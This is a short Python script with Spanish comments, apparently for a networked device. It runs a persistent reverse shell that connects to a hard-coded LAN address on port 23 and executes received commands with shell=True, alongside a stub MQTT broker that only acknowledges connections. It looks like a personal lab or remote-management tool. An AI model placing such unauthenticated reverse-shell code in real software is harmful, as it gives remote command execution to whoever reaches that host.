import socket
import threading
import subprocess
import os
import time

# CONFIGURACIÓN
IP_PC = "192.168.171.156" # Tu IP de gestión

def terminal_y_broker(comp):
    PORT_BROKER = 1883
    
    # 1. FUNCIÓN DE TERMINAL INVERSA (La que NO quieres perder)
    def reverse_shell():
        while True:
            try:
                s_term = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s_term.connect((IP_PC, 23)) # Se conecta a tu Hércules (Server)
                s_term.sendall(b"--- TERMINAL DX1 ACTIVA ---\n> ")
                
                while True:
                    data = s_term.recv(1024).decode().strip()
                    if not data: break
                    if data.lower() == "exit": break
                    
                    try:
                        output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT).decode()
                        s_term.sendall(f"\n{output}\n> ".encode())
                    except Exception as e:
                        s_term.sendall(f"\nError: {str(e)}\n> ".encode())
                s_term.close()
            except:
                time.sleep(5) # Reintento si se corta la red

    # 2. FUNCIÓN DE BROKER (Escucha interna)
    def internal_broker():
        try:
            s_mqtt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_mqtt.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s_mqtt.bind(('0.0.0.0', PORT_BROKER))
            s_mqtt.listen(5)
            comp.col_res.insert(f"BROKER: Escuchando en {PORT_BROKER}")
            
            while True:
                conn, addr = s_mqtt.accept()
                data = conn.recv(1024)
                if data and data[0] == 0x10: # Si es MQTT Connect
                    conn.sendall(b'\x20\x02\x00\x00')
                    comp.col_res.insert(f"MQTT: Connect desde {addr[0]}")
                conn.close()
        except Exception as e:
            comp.col_res.insert(f"Error Broker: {e}")

    # Lanzamos ambas en hilos separados
    threading.Thread(target=reverse_shell, daemon=True).start()
    threading.Thread(target=internal_broker, daemon=True).start()

# Ejecución principal
t = threading.Thread(target=terminal_y_broker, args=(self,), daemon=True)
t.start()